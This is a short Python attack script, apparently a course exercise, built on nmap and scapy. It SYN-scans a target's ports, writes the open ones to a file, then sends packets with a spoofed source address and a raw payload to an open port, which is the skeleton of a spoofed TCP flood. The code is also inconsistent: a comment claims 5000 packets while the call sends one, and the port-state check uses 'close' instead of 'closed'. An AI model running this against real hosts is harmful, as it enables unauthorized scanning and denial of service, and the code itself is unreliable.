#from random import randint
import nmap, ipaddress, tcp as TCP
from scapy.modules.six import StringIO
from scapy.layers.inet import IP
from scapy.all import *
#it is important to install the latest version of python nmap/nmap
# Python version : Python 3.9.2

class TcpAttack:
    def __init__(self,spoofIP,targetIP):  #Constructor for TcpAttack
        self.spoofIP = spoofIP  
        self.targetIP = targetIP  
        
    def scanTarget(self, rangeStart, rangeEnd):
        nm=nmap.PortScanner()
        # always opens a new .txt file to output open ports-called(openports)
        f= open("openports.txt","w+")
        for port in range( rangeStart, rangeEnd + 1):
            try:
                # Scans using nmap's TCP SYN (Stealth) scan method(https://nmap.org/book/synscan.html)
                # the '-sS' method doesn't complete TCP connections (no RST is sent to close)
                result = nm.scan(self.targetIP, str(port), '-sS')
                # We extract the port status from the returned object
                port_status = (result['scan'][self.targetIP]['tcp'][port]['state'])
                print(f"Port {port} is {port_status}")
                if port_status=="open":
                    f.write(f"Port {port} is {port_status}\n")
            except: #allows the program to print "Port not scanned" if the above block can't be executed
                print(f"Port {port} not scanned .")
        f.close()
        
    def attackTarget(self, port):
        
        nm=nmap.PortScanner()
        # perform a half open scan
        result = nm.scan(self.targetIP, str(port), '-sS')
        port_status = (result['scan'][self.targetIP]['tcp'][port]['state'])
        #r is the raw set of bites to be sent in the packets
        r = Raw(b"X"*1024)
        if port_status=="open":
            #this part sends 5000 packets instead of the unlimited amount to the target
            send(IP(src=self.spoofIP, dst=self.targetIP)/TCP(sport=RandShort(),dport=port)/r, count=1)
            return 1
        elif port_status == "close":
            return 0

